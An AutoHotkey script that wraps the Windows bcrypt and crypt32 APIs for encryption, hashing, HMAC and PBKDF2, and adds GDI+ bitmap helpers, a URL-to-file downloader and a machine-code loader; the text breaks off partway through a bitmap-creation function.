#NoEnv
#NoTrayIcon
#SingleInstance off
SetBatchLines, -1
ListLines, Off
Global A_Args:={}, MHGui:={}, Save:={}, Data:={}
SetModuleHandle()
A_Args.FontDPI := A_ScreenDPI <= 100 ? 0 : A_ScreenDPI > 130 ? 3 : A_ScreenDPI > 110 ? 2 : "Error"
If (A_Args.FontDPI = "Error")
MsgBox, "ScreenDPI Error."
class classCrypt {
class Encrypt {
String(AlgId, Mode := "", String := "", Key := "", IV := "", Encoding := "utf-8", Output := "BASE64") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.EncryptionAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if (CHAINING_MODE := Crypt.Verify.ChainingMode(Mode))
if !(Crypt.BCrypt.SetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_CHAINING_MODE, CHAINING_MODE))
throw Exception("SetProperty failed", -1)
if !(KEY_HANDLE := Crypt.BCrypt.GenerateSymmetricKey(ALG_HANDLE, Key, Encoding))
throw Exception("GenerateSymmetricKey failed", -1)
if !(BLOCK_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_BLOCK_LENGTH, 4))
throw Exception("GetProperty failed", -1)
cbInput := Crypt.Helper.StrPutVar(String, pbInput, Encoding)
if !(CIPHER_LENGTH := Crypt.BCrypt.Encrypt(KEY_HANDLE, pbInput, cbInput, IV, BLOCK_LENGTH, CIPHER_DATA, Crypt.Constants.BCRYPT_BLOCK_PADDING))
throw Exception("Encrypt failed", -1)
if !(ENCRYPT := Crypt.Helper.CryptBinaryToString(CIPHER_DATA, CIPHER_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (KEY_HANDLE)
Crypt.BCrypt.DestroyKey(KEY_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return ENCRYPT
}
}
class Decrypt {
String(AlgId, Mode := "", String := "", Key := "", IV := "", Encoding := "utf-8", Input := "BASE64") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.EncryptionAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if (CHAINING_MODE := Crypt.Verify.ChainingMode(Mode))
if !(Crypt.BCrypt.SetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_CHAINING_MODE, CHAINING_MODE))
throw Exception("SetProperty failed", -1)
if !(KEY_HANDLE := Crypt.BCrypt.GenerateSymmetricKey(ALG_HANDLE, Key, Encoding))
throw Exception("GenerateSymmetricKey failed", -1)
if !(CIPHER_LENGTH := Crypt.Helper.CryptStringToBinary(String, CIPHER_DATA, Input))
throw Exception("CryptStringToBinary failed", -1)
if !(BLOCK_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_BLOCK_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(DECRYPT_LENGTH := Crypt.BCrypt.Decrypt(KEY_HANDLE, CIPHER_DATA, CIPHER_LENGTH, IV, BLOCK_LENGTH, DECRYPT_DATA, Crypt.Constants.BCRYPT_BLOCK_PADDING))
throw Exception("Decrypt failed", -1)
DECRYPT := StrGet(&DECRYPT_DATA, DECRYPT_LENGTH, Encoding)
}
catch Exception
{
throw Exception
}
finally
{
if (KEY_HANDLE)
Crypt.BCrypt.DestroyKey(KEY_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return DECRYPT
}
}
class Hash {
String(AlgId, String, Encoding := "utf-8", Output := "HEXRAW") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(HASH_HANDLE := Crypt.BCrypt.CreateHash(ALG_HANDLE))
throw Exception("CreateHash failed", -1)
cbInput := Crypt.Helper.StrPutVar(String, pbInput, Encoding)
if !(Crypt.BCrypt.HashData(HASH_HANDLE, pbInput, cbInput))
throw Exception("HashData failed", -1)
if !(HASH_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_HASH_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(Crypt.BCrypt.FinishHash(HASH_HANDLE, HASH_DATA, HASH_LENGTH))
throw Exception("FinishHash failed", -1)
if !(HASH := Crypt.Helper.CryptBinaryToString(HASH_DATA, HASH_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (HASH_HANDLE)
Crypt.BCrypt.DestroyHash(HASH_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return HASH
}
File(AlgId, FileName, Bytes := 1048576, Offset := 0, Length := -1, Encoding := "utf-8", Output := "HEXRAW"){
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(HASH_HANDLE := Crypt.BCrypt.CreateHash(ALG_HANDLE))
throw Exception("CreateHash failed", -1)
if !(IsObject(File := FileOpen(FileName, "r", Encoding)))
throw Exception("Failed to open file: " FileName, -1)
Length := Length < 0 ? File.Length - Offset : Length
if ((Offset + Length) > File.Length)
throw Exception("Invalid parameters offset / length!", -1)
while (Length > Bytes) && (Dataread := File.RawRead(Data, Bytes))
{
if !(Crypt.BCrypt.HashData(HASH_HANDLE, Data, Dataread))
throw Exception("HashData failed", -1)
Length -= Dataread
}
if (Length > 0)
{
if (Dataread := File.RawRead(Data, Length))
{
if !(Crypt.BCrypt.HashData(HASH_HANDLE, Data, Dataread))
throw Exception("HashData failed", -1)
}
}
if !(HASH_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_HASH_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(Crypt.BCrypt.FinishHash(HASH_HANDLE, HASH_DATA, HASH_LENGTH))
throw Exception("FinishHash failed", -1)
if !(HASH := Crypt.Helper.CryptBinaryToString(HASH_DATA, HASH_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (File)
File.Close()
if (HASH_HANDLE)
Crypt.BCrypt.DestroyHash(HASH_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return HASH
}
HMAC(AlgId, String, Hmac, Encoding := "utf-8", Output := "HEXRAW") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER, Crypt.Constants.BCRYPT_ALG_HANDLE_HMAC_FLAG))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(HASH_HANDLE := Crypt.BCrypt.CreateHash(ALG_HANDLE, Hmac, Encoding))
throw Exception("CreateHash failed", -1)
cbInput := Crypt.helper.StrPutVar(String, pbInput, Encoding)
if !(Crypt.BCrypt.HashData(HASH_HANDLE, pbInput, cbInput))
throw Exception("HashData failed", -1)
if !(HASH_LENGTH := Crypt.BCrypt.GetProperty(ALG_HANDLE, Crypt.Constants.BCRYPT_HASH_LENGTH, 4))
throw Exception("GetProperty failed", -1)
if !(Crypt.BCrypt.FinishHash(HASH_HANDLE, HASH_DATA, HASH_LENGTH))
throw Exception("FinishHash failed", -1)
if !(HMAC := Crypt.Helper.CryptBinaryToString(HASH_DATA, HASH_LENGTH, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (HASH_HANDLE)
Crypt.BCrypt.DestroyHash(HASH_HANDLE)
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return HMAC
}
PBKDF2(AlgId, Password, Salt, Iterations := 4096, KeySize := 256, Encoding := "utf-8", Output := "HEXRAW") {
try
{
if !(ALGORITHM_IDENTIFIER := Crypt.Verify.HashAlgorithm(AlgId))
throw Exception("Wrong ALGORITHM_IDENTIFIER", -1)
if !(ALG_HANDLE := Crypt.BCrypt.OpenAlgorithmProvider(ALGORITHM_IDENTIFIER, Crypt.Constants.BCRYPT_ALG_HANDLE_HMAC_FLAG))
throw Exception("BCryptOpenAlgorithmProvider failed", -1)
if !(Crypt.BCrypt.DeriveKeyPBKDF2(ALG_HANDLE, Password, Salt, Iterations, PBKDF2_DATA, KeySize / 8, Encoding))
throw Exception("CreateHash failed", -1)
if !(PBKDF2 := Crypt.Helper.CryptBinaryToString(PBKDF2_DATA , KeySize / 8, Output))
throw Exception("CryptBinaryToString failed", -1)
}
catch Exception
{
throw Exception
}
finally
{
if (ALG_HANDLE)
Crypt.BCrypt.CloseAlgorithmProvider(ALG_HANDLE)
}
return PBKDF2
}
}
class BCrypt {
static hBCRYPT := DllCall("LoadLibrary", "str", "bcrypt.dll", "ptr")
static STATUS_SUCCESS := 0
CloseAlgorithmProvider(hAlgorithm) {
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", hAlgorithm, "uint", 0)
}
CreateHash(hAlgorithm, hmac := 0, encoding := "utf-8") {
if (hmac)
cbSecret := Crypt.helper.StrPutVar(hmac, pbSecret, encoding)
NT_STATUS := DllCall("bcrypt\BCryptCreateHash", "ptr",  hAlgorithm
, "ptr*", phHash
, "ptr",  pbHashObject := 0
, "uint", cbHashObject := 0
, "ptr",  (pbSecret ? &pbSecret : 0)
, "uint", (cbSecret ? cbSecret : 0)
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return phHash
return false
}
DeriveKeyPBKDF2(hPrf, Password, Salt, cIterations, ByRef pbDerivedKey, cbDerivedKey, Encoding := "utf-8") {
cbPassword := Crypt.Helper.StrPutVar(Password, pbPassword, Encoding)
cbSalt := Crypt.Helper.StrPutVar(Salt, pbSalt, Encoding)
VarSetCapacity(pbDerivedKey, cbDerivedKey, 0)
NT_STATUS := DllCall("bcrypt\BCryptDeriveKeyPBKDF2", "ptr",   hPrf
, "ptr",   &pbPassword
, "uint",  cbPassword
, "ptr",   &pbSalt
, "uint",  cbSalt
, "int64", cIterations
, "ptr",   &pbDerivedKey
, "uint",  cbDerivedKey
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return true
return false
}
DestroyHash(hHash) {
DllCall("bcrypt\BCryptDestroyHash", "ptr", hHash)
}
DestroyKey(hKey) {
DllCall("bcrypt\BCryptDestroyKey", "ptr", hKey)
}
Decrypt(hKey, ByRef String, cbInput, IV, BCRYPT_BLOCK_LENGTH, ByRef pbOutput, dwFlags) {
VarSetCapacity(pbInput, cbInput, 0)
DllCall("msvcrt\memcpy", "ptr", &pbInput, "ptr", &String, "ptr", cbInput)
if (IV != "")
{
cbIV := VarSetCapacity(pbIV, BCRYPT_BLOCK_LENGTH, 0)
StrPut(IV, &pbIV, BCRYPT_BLOCK_LENGTH, Encoding)
}
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   0
, "uint",  0
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   &pbOutput
, "uint",  cbOutput
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
return cbOutput
}
}
return false
}
Encrypt(hKey, ByRef pbInput, cbInput, IV, BCRYPT_BLOCK_LENGTH, ByRef pbOutput, dwFlags := 0) {
if (IV != "")
{
cbIV := VarSetCapacity(pbIV, BCRYPT_BLOCK_LENGTH, 0)
StrPut(IV, &pbIV, BCRYPT_BLOCK_LENGTH, Encoding)
}
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   0
, "uint",  0
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr",   hKey
, "ptr",   &pbInput
, "uint",  cbInput
, "ptr",   0
, "ptr",   (pbIV ? &pbIV : 0)
, "uint",  (cbIV ? &cbIV : 0)
, "ptr",   &pbOutput
, "uint",  cbOutput
, "uint*", cbOutput
, "uint",  dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
{
return cbOutput
}
}
return false
}
EnumAlgorithms(dwAlgOperations) {
NT_STATUS := DllCall("bcrypt\BCryptEnumAlgorithms", "uint",  dwAlgOperations
, "uint*", pAlgCount
, "ptr*",  ppAlgList
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
{
addr := ppAlgList, BCRYPT_ALGORITHM_IDENTIFIER := []
loop % pAlgCount
{
BCRYPT_ALGORITHM_IDENTIFIER[A_Index, "Name"]  := StrGet(NumGet(addr + A_PtrSize * 0, "uptr"), "utf-16")
BCRYPT_ALGORITHM_IDENTIFIER[A_Index, "Class"] := NumGet(addr + A_PtrSize * 1, "uint")
BCRYPT_ALGORITHM_IDENTIFIER[A_Index, "Flags"] := NumGet(addr + A_PtrSize * 1 + 4, "uint")
addr += A_PtrSize * 2
}
return BCRYPT_ALGORITHM_IDENTIFIER
}
return false
}
EnumProviders(pszAlgId) {
NT_STATUS := DllCall("bcrypt\BCryptEnumProviders", "ptr",   pszAlgId
, "uint*", pImplCount
, "ptr*",  ppImplList
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
{
addr := ppImplList, BCRYPT_PROVIDER_NAME := []
loop % pImplCount
{
BCRYPT_PROVIDER_NAME.Push(StrGet(NumGet(addr + A_PtrSize * 0, "uptr"), "utf-16"))
addr += A_PtrSize
}
return BCRYPT_PROVIDER_NAME
}
return false
}
FinishHash(hHash, ByRef pbOutput, cbOutput) {
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptFinishHash", "ptr",  hHash
, "ptr",  &pbOutput
, "uint", cbOutput
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return cbOutput
return false
}
GenerateSymmetricKey(hAlgorithm, Key, Encoding := "utf-8") {
cbSecret := Crypt.Helper.StrPutVar(Key, pbSecret, Encoding)
NT_STATUS := DllCall("bcrypt\BCryptGenerateSymmetricKey", "ptr",  hAlgorithm
, "ptr*", phKey
, "ptr",  0
, "uint", 0
, "ptr",  &pbSecret
, "uint", cbSecret
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return phKey
return false
}
GetProperty(hObject, pszProperty, cbOutput) {
NT_STATUS := DllCall("bcrypt\BCryptGetProperty", "ptr",   hObject
, "ptr",   &pszProperty
, "uint*", pbOutput
, "uint",  cbOutput
, "uint*", pcbResult
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return pbOutput
return false
}
HashData(hHash, ByRef pbInput, cbInput) {
NT_STATUS := DllCall("bcrypt\BCryptHashData", "ptr",  hHash
, "ptr",  &pbInput
, "uint", cbInput
, "uint", dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return true
return false
}
OpenAlgorithmProvider(pszAlgId, dwFlags := 0, pszImplementation := 0) {
NT_STATUS := DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", phAlgorithm
, "ptr",  &pszAlgId
, "ptr",  pszImplementation
, "uint", dwFlags)
if (NT_STATUS = this.STATUS_SUCCESS)
return phAlgorithm
return false
}
SetProperty(hObject, pszProperty, pbInput) {
bInput := StrLen(pbInput)
NT_STATUS := DllCall("bcrypt\BCryptSetProperty", "ptr",   hObject
, "ptr",   &pszProperty
, "ptr",   &pbInput
, "uint",  bInput
, "uint",  dwFlags := 0)
if (NT_STATUS = this.STATUS_SUCCESS)
return true
return false
}
}
class Helper {
static hCRYPT32 := DllCall("LoadLibrary", "str", "crypt32.dll", "ptr")
CryptBinaryToString(ByRef pbBinary, cbBinary, dwFlags := "BASE64") {
static CRYPT_STRING := { "BASE64": 0x1, "BINARY": 0x2, "HEX": 0x4, "HEXRAW": 0xc }
static CRYPT_STRING_NOCRLF := 0x40000000
if (DllCall("crypt32\CryptBinaryToString", "ptr",   &pbBinary
, "uint",  cbBinary
, "uint",  (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF)
, "ptr",   0
, "uint*", pcchString))
{
VarSetCapacity(pszString, pcchString << !!A_IsUnicode, 0)
if (DllCall("crypt32\CryptBinaryToString", "ptr",   &pbBinary
, "uint",  cbBinary
, "uint",  (CRYPT_STRING[dwFlags] | CRYPT_STRING_NOCRLF)
, "ptr",   &pszString
, "uint*", pcchString))
{
return StrGet(&pszString)
}
}
return false
}
CryptStringToBinary(pszString, ByRef pbBinary, dwFlags := "BASE64") {
static CRYPT_STRING := { "BASE64": 0x1, "BINARY": 0x2, "HEX": 0x4, "HEXRAW": 0xc }
if (DllCall("crypt32\CryptStringToBinary", "ptr",   &pszString
, "uint",  0
, "uint",  CRYPT_STRING[dwFlags]
, "ptr",   0
, "uint*", pcbBinary
, "ptr",   0
, "ptr",   0))
{
VarSetCapacity(pbBinary, pcbBinary, 0)
if (DllCall("crypt32\CryptStringToBinary", "ptr",   &pszString
, "uint",  0
, "uint",  CRYPT_STRING[dwFlags]
, "ptr",   &pbBinary
, "uint*", pcbBinary
, "ptr",   0
, "ptr",   0))
{
return pcbBinary
}
}
return false
}
StrPutVar(String, ByRef Data, Encoding) {
if (Encoding = "hex")
{
String := InStr(String, "0x") ? SubStr(String, 3) : String
VarSetCapacity(Data, (Length := StrLen(String) // 2), 0)
loop % Length
NumPut("0x" SubStr(String, 2 * A_Index - 1, 2), Data, A_Index - 1, "char")
return Length
}
else
{
VarSetCapacity(Data, Length := StrPut(String, Encoding) * ((Encoding = "utf-16" || Encoding = "cp1200") ? 2 : 1) - 1)
return StrPut(String, &Data, Length, Encoding)
}
}
}
class Verify {
ChainingMode(ChainMode) {
switch ChainMode
{
case "CBC", "ChainingModeCBC": return Crypt.Constants.BCRYPT_CHAIN_MODE_CBC
case "CFB", "ChainingModeCFB": return Crypt.Constants.BCRYPT_CHAIN_MODE_CFB
case "ECB", "ChainingModeECB": return Crypt.Constants.BCRYPT_CHAIN_MODE_ECB
default: return ""
}
}
EncryptionAlgorithm(Algorithm) {
switch Algorithm
{
case "AES":                return Crypt.Constants.BCRYPT_AES_ALGORITHM
case "DES":                return Crypt.Constants.BCRYPT_DES_ALGORITHM
case "RC2":                return Crypt.Constants.BCRYPT_RC2_ALGORITHM
case "RC4":                return Crypt.Constants.BCRYPT_RC4_ALGORITHM
default: return ""
}
}
HashAlgorithm(Algorithm) {
switch Algorithm
{
case "MD2":               return Crypt.Constants.BCRYPT_MD2_ALGORITHM
case "MD4":               return Crypt.Constants.BCRYPT_MD4_ALGORITHM
case "MD5":               return Crypt.Constants.BCRYPT_MD5_ALGORITHM
case "SHA1", "SHA-1":     return Crypt.Constants.BCRYPT_SHA1_ALGORITHM
case "SHA256", "SHA-256": return Crypt.Constants.BCRYPT_SHA256_ALGORITHM
case "SHA384", "SHA-384": return Crypt.Constants.BCRYPT_SHA384_ALGORITHM
case "SHA512", "SHA-512": return Crypt.Constants.BCRYPT_SHA512_ALGORITHM
default: return ""
}
}
}
class Constants {
static BCRYPT_ALG_HANDLE_HMAC_FLAG            := 0x00000008
static BCRYPT_BLOCK_PADDING                   := 0x00000001
static BCRYPT_CIPHER_OPERATION                := 0x00000001
static BCRYPT_HASH_OPERATION                  := 0x00000002
static BCRYPT_ASYMMETRIC_ENCRYPTION_OPERATION := 0x00000004
static BCRYPT_SECRET_AGREEMENT_OPERATION      := 0x00000008
static BCRYPT_SIGNATURE_OPERATION             := 0x00000010
static BCRYPT_RNG_OPERATION                   := 0x00000020
static BCRYPT_KEY_DERIVATION_OPERATION        := 0x00000040
static BCRYPT_3DES_ALGORITHM                  := "3DES"
static BCRYPT_3DES_112_ALGORITHM              := "3DES_112"
static BCRYPT_AES_ALGORITHM                   := "AES"
static BCRYPT_AES_CMAC_ALGORITHM              := "AES-CMAC"
static BCRYPT_AES_GMAC_ALGORITHM              := "AES-GMAC"
static BCRYPT_DES_ALGORITHM                   := "DES"
static BCRYPT_DESX_ALGORITHM                  := "DESX"
static BCRYPT_MD2_ALGORITHM                   := "MD2"
static BCRYPT_MD4_ALGORITHM                   := "MD4"
static BCRYPT_MD5_ALGORITHM                   := "MD5"
static BCRYPT_RC2_ALGORITHM                   := "RC2"
static BCRYPT_RC4_ALGORITHM                   := "RC4"
static BCRYPT_RNG_ALGORITHM                   := "RNG"
static BCRYPT_SHA1_ALGORITHM                  := "SHA1"
static BCRYPT_SHA256_ALGORITHM                := "SHA256"
static BCRYPT_SHA384_ALGORITHM                := "SHA384"
static BCRYPT_SHA512_ALGORITHM                := "SHA512"
static BCRYPT_PBKDF2_ALGORITHM                := "PBKDF2"
static BCRYPT_XTS_AES_ALGORITHM               := "XTS-AES"
static BCRYPT_BLOCK_LENGTH                    := "BlockLength"
static BCRYPT_CHAINING_MODE                   := "ChainingMode"
static BCRYPT_CHAIN_MODE_CBC                  := "ChainingModeCBC"
static BCRYPT_CHAIN_MODE_CCM                  := "ChainingModeCCM"
static BCRYPT_CHAIN_MODE_CFB                  := "ChainingModeCFB"
static BCRYPT_CHAIN_MODE_ECB                  := "ChainingModeECB"
static BCRYPT_CHAIN_MODE_GCM                  := "ChainingModeGCM"
static BCRYPT_HASH_LENGTH                     := "HashDigestLength"
static BCRYPT_OBJECT_LENGTH                   := "ObjectLength"
}
}
LoadGDIplus(){
UPtr()
VarSetCapacity(startInput, A_PtrSize = 8 ? 24 : 16, 0), startInput := Chr(1)
HModuleGdip := DllCall("LoadLibrary", "Str", "gdiplus", "Ptr")
DllCall("gdiplus\GdiplusStartup", "Ptr*", pToken, "Ptr", &startInput, "Ptr", 0)
A_Args.Proc:={}
A_Args.Proc.BitBlt                  := DllCall("GetProcAddress", "Ptr", DllCall("GetModuleHandle", "Str", "gdi32", "Ptr"), "AStr", "BitBlt", "Ptr")
A_Args.Proc.CloneBitmap             := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCloneBitmapArea", "Ptr")
A_Args.Proc.BitmapLock              := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipBitmapLockBits", "Ptr")
A_Args.Proc.BitmapUnlock            := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipBitmapUnlockBits", "Ptr")
A_Args.Proc.DisposeImage            := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipDisposeImage", "Ptr")
A_Args.Proc.DrawImageRect           := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipDrawImageRect", "Ptr")
A_Args.Proc.DrawImageFast           := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipDrawImage", "Ptr")
A_Args.Proc.GetImageGraphic         := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipGetImageGraphicsContext", "Ptr")
A_Args.Proc.CreateBitmapFromScan    := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCreateBitmapFromScan0", "Ptr")
A_Args.Proc.CreateBitmapFromHBITMAP := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCreateBitmapFromHBITMAP", "Ptr")
A_Args.Proc.CreateBitmapFromFile    := DllCall("GetProcAddress", "Ptr", HModuleGdip, "AStr", "GdipCreateBitmapFromFile", "Ptr")
}
Gdip_GetFile(url, filename){
static a:="AutoHotkey/" A_AhkVersion, c:=0, s:=0
if (!(o := FileOpen(filename, "w")) || !DllCall("LoadLibrary", "str", "wininet") || !(h := DllCall("wininet\InternetOpen", "str", a, "uint", 1, "ptr", 0, "ptr", 0, "uint", 0, "ptr")))
return 0
if (f := DllCall("wininet\InternetOpenUrl", "ptr", h, "str", url, "ptr", 0, "uint", 0, "uint", 0x80003000, "ptr", 0, "ptr")){
while (DllCall("wininet\InternetQueryDataAvailable", "ptr", f, "uint*", s, "uint", 0, "ptr", 0) && s>0){
VarSetCapacity(b, s, 0)
DllCall("wininet\InternetReadFile", "ptr", f, "ptr", &b, "uint", s, "uint*", r), c += r
o.rawWrite(b, r)
}
DllCall("wininet\InternetCloseHandle", "ptr", f)
}
DllCall("wininet\InternetCloseHandle", "ptr", h)
o.close()
return c
}
GetInBetween(string,PontA,PontB,ByRef Pos:=""){
Pos := RegExMatch(string, "(?<=" PontA ")(.*)(?=" PontB ")", Info)
Return Info
}
Gdip_UTF(In){
Return StrGet(&In,"UTF-8")
}
Gdip_GetImageDimensions(pBitmap, ByRef Width, ByRef Height){
If StrLen(pBitmap)<3
Return -1
Width := 0, Height := 0
E := DllCall("gdiplus\GdipGetImageDimension", "UPtr", pBitmap, "float*", Width, "float*", Height)
Width := Round(Width)
Height := Round(Height)
return E
}
Gdip_RunMCode(mcode){
static e := {1:4, 2:1}, c := (A_PtrSize=8) ? "x64" : "x86"
if (!regexmatch(mcode, "^([0-9]+),(" c ":|.*?," c ":)([^,]+)", m))
return
if (!DllCall("crypt32\CryptStringToBinary", "str", m3, "uint", StrLen(m3), "uint", e[m1], "ptr", 0, "uintp", s, "ptr", 0, "ptr", 0))
return
p := DllCall("GlobalAlloc", "uint", 0, "ptr", s, "ptr")
DllCall("VirtualProtect", "ptr", p, "ptr", s, "uint", 0x40, "uint*", op)
if (DllCall("crypt32\CryptStringToBinary", "str", m3, "uint", StrLen(m3), "uint", e[m1], "ptr", p, "uint*", s, "ptr", 0, "ptr", 0))
return p
DllCall("GlobalFree", "ptr", p)
}
MsgData(Obj, Type:=""){
if (!IsObject(obj)){
try
Obj := Data["Msg"][Obj]
MsgBox, % Type, % Obj["T"][Save.Ling], % Obj["M"][Save.Ling]
Return
}
MsgBox, % Type, % Obj.1, % Obj.2
}
Gdip_CreateBitmap(Width, Height, PixelFormat:=0, Stride:=0, Scan0:=0){
pBitmap := 0
If !PixelFormat
PixelFormat := 0x26200A
DllCall(A_Args.Proc.CreateBitmapFromScan, "int", Width, "int", Height, "int", Stride, "int", PixelFormat, "UPtr", Scan0, "UPtr*", pBitmap)
Return pBitmap
}
Gdip_CreateBitmapFromFile(sFile, IconNumber:=1, IconSize:="", useICM:=0){
pBitmap := 0
, pBitmapOld := 0
, hIcon := 0
SplitPath sFile,,, Extension
if RegExMatch(Extension, "^(?i:exe|dll)$"){
Sizes := IconSize ? IconSize : 256 "|" 128 "|" 64 "|" 48 "|" 32 "|" 16
BufSize := 16 + (2*A_PtrSize)
VarSetCapacity(buf, BufSize, 0)
For eachSize, Size in StrSplit( Sizes, "|" ){
DllCall("PrivateExtractIcons", "str", sFile, "int", IconNumber-1, "int", Size, "int", Size, "UPtr*", hIcon, "UPtr*", 0, "uint", 1, "uint", 0)
if !hIcon
continue
if !DllCall("GetIconInfo", "UPtr", hIcon, "UPtr", &buf){
DllCall("DestroyIcon", "UPtr", hIcon)
continue
}
hbmMask := NumGet(buf, 12 + (A_PtrSize - 4))
hbmColor := NumGet(buf, 12 + (A_PtrSize - 4) + A_PtrSize)
if !(hbmColor && DllCall("GetObject", "UPtr", hbmColor, "int", BufSize, "UPtr", &buf)){
DllCall("DestroyIcon", "UPtr", hIcon)
continue
}
break
}
if !hIcon
return -1
Width := NumGet(buf, 4, "int"), Height := NumGet(buf, 8, "int")
hbm := CreateDIBSection(Width, -Height), hdc := CreateCompatibleDC(), obm := SelectObject(hdc, hbm)
if !DllCall("DrawIconEx", "UPtr", hdc, "int", 0, "int", 0, "UPtr", hIcon, "uint", Width, "uint", Height, "uint", 0, "UPtr", 0, "uint", 3){
DllCall("DestroyIcon", "UPtr", hIcon)
return -2
}
VarSetCapacity(dib, 104)
, DllCall("GetObject", "UPtr", hbm, "int", A_PtrSize = 8 ? 104 : 84, "UPtr", &dib)
, Stride := NumGet(dib, 12, "Int"), Scan0 := NumGet(dib, 20 + (A_PtrSize = 8 ? 4 : 0))
, DllCall(A_Args.Proc.CreateBitmapFromScan, "int", Width, "int", Height, "int", Stride, "int", 0x26200A, "UPtr", Scan0, "UPtr*", pBitmapOld)
, DllCall(A_Args.Proc.CreateBitmapFromScan, "int", Width, "int", Height, "int", 0, "int", 0x26200A, "UPtr", 0, "UPtr*", pBitmap)
